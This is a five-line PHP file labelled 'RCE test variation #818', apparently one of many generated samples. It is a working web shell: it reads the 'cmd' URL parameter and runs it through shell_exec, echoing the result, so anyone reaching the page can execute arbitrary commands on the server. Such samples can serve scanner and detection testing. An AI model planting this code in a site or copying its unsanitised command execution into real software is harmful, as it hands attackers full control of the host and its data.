<?php
// RCE test variation #818
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>